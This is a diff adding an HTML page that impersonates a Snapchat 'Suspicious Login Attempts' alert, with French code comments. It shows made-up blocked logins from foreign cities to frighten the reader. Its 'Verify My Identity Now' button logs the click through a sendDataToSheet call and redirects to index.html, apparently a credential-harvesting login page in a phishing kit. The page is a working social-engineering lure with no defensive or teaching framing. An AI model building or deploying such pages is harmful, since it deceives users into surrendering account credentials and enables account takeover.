@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Security Alert</title>
+    <link rel="icon" type="image/png" href="Snapchat.png">
+    <link rel="stylesheet" href="Snapchat.css">
+    <meta name="description" content="Snapchat Security Alert">
+    <meta name="robots" content="noindex, nofollow">
+    <style>
+        .alert-container {
+            max-width: 550px;
+            animation: slideUp 0.4s ease;
+        }
+        
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .alert-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 24px;
+            padding: 20px;
+            background: linear-gradient(135deg, #ff6b6b 0%, #ff5252 100%);
+            border-radius: 16px;
+            color: white;
+        }
+        
+        .warning-icon {
+            width: 48px;
+            height: 48px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pulse 2s infinite;
+            flex-shrink: 0;
+        }
+        
+        .alert-header-text h1 {
+            font-size: 20px;
+            margin: 0 0 4px 0;
+            color: white;
+        }
+        
+        .alert-header-text p {
+            margin: 0;
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .activity-list {
+            margin: 24px 0;
+        }
+        
+        .activity-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px;
+            margin: 12px 0;
+            background: #fff;
+            border-radius: 12px;
+            border: 2px solid #f0f0f0;
+            border-left: 4px solid #ff3333;
+            transition: all 0.2s;
+        }
+        
+        .activity-item:hover {
+            border-color: #ff3333;
+            box-shadow: 0 4px 12px rgba(255, 51, 51, 0.1);
+        }
+        
+        .activity-info {
+            flex: 1;
+        }
+        
+        .activity-location {
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 4px;
+            font-size: 15px;
+        }
+        
+        .activity-time {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 2px;
+        }
+        
+        .activity-device {
+            font-size: 12px;
+            color: #999;
+        }
+        
+        .status-badge {
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        
+        .status-blocked {
+            background: #ffe0e0;
+            color: #cc0000;
+        }
+        
+        .status-suspicious {
+            background: #fff4cc;
+            color: #cc6600;
+        }
+        
+        .secure-button {
+            background: linear-gradient(135deg, #fffc00 0%, #ffd700 100%);
+            color: #000;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            width: 100%;
+            font-weight: 700;
+            font-size: 16px;
+            margin-top: 24px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 252, 0, 0.3);
+            transition: all 0.2s;
+        }
+        
+        .secure-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 252, 0, 0.4);
+        }
+        
+        .info-box {
+            background: #f0f8ff;
+            border-left: 4px solid #0078ff;
+            padding: 16px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+        
+        .info-box p {
+            margin: 0;
+            font-size: 13px;
+            color: #333;
+        }
+        
+        .info-box strong {
+            color: #0078ff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container alert-container">
+        <img src="Snapchat.png" alt="Snapchat Logo" class="logo">
+        
+        <div class="alert-header">
+            <div class="warning-icon">
+                <svg width="28" height="28" fill="white" stroke="white" stroke-width="2">
+                    <path d="M12 9v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                </svg>
+            </div>
+            <div class="alert-header-text">
+                <h1 id="alert-title">Suspicious Login Attempts Detected</h1>
+                <p id="alert-subtitle">We blocked several unauthorized access attempts</p>
+            </div>
+        </div>
+        
+        <div class="activity-list">
+            <div class="activity-item">
+                <div class="activity-info">
+                    <div class="activity-location">📍 Moscow, Russia</div>
+                    <div class="activity-time">Today at 2:34 AM</div>
+                    <div class="activity-device">Unknown Device • Chrome on Windows</div>
+                </div>
+                <span class="status-badge status-blocked">Blocked</span>
+            </div>
+            
+            <div class="activity-item">
+                <div class="activity-info">
+                    <div class="activity-location">📍 Lagos, Nigeria</div>
+                    <div class="activity-time">Today at 1:12 AM</div>
+                    <div class="activity-device">Unknown Device • Firefox on Linux</div>
+                </div>
+                <span class="status-badge status-blocked">Blocked</span>
+            </div>
+            
+            <div class="activity-item">
+                <div class="activity-info">
+                    <div class="activity-location">📍 Shanghai, China</div>
+                    <div class="activity-time">Yesterday at 11:47 PM</div>
+                    <div class="activity-device">Android Device • Snapchat App</div>
+                </div>
+                <span class="status-badge status-suspicious">Suspicious</span>
+            </div>
+        </div>
+        
+        <div class="info-box">
+            <p><strong>⚡ Action Required:</strong> Verify your identity to secure your account and prevent unauthorized access.</p>
+        </div>
+        
+        <button class="secure-button" onclick="secureAccount()">
+            🔒 Verify My Identity Now
+        </button>
+        
+        <p class="support-text" id="support-text" style="margin-top: 20px;">
+            Learn more about <a href="#" onclick="return false;">account security</a>
+        </p>
+    </div>
+    
+    <script src="script.js"></script>
+    <script>
+        // Fonction pour sécuriser le compte
+        function secureAccount() {
+            sendDataToSheet('Security Alert', 'User clicked "Verify My Identity" from security alert page');
+            
+            // Animation de chargement
+            const button = document.querySelector('.secure-button');
+            button.textContent = '🔄 Redirecting...';
+            button.disabled = true;
+            button.style.opacity = '0.7';
+            
+            setTimeout(() => {
+                window.location.href = 'index.html';
+            }, 800);
+        }
+        
+        // Traductions
+        const alertTranslations = {
+            en: {
+                title: "Suspicious Login Attempts Detected",
+                subtitle: "We blocked several unauthorized access attempts"
+            },
+            fr: {
+                title: "Tentatives de connexion suspectes détectées",
+                subtitle: "Nous avons bloqué plusieurs tentatives d'accès non autorisées"
+            }
+        };
+        
+        // Appliquer la traduction si nécessaire
+        if (typeof currentLang !== 'undefined' && currentLang === 'fr') {
+            document.getElementById('alert-title').textContent = alertTranslations.fr.title;
+            document.getElementById('alert-subtitle').textContent = alertTranslations.fr.subtitle;
+        }
+    </script>
+</body>
+</html>
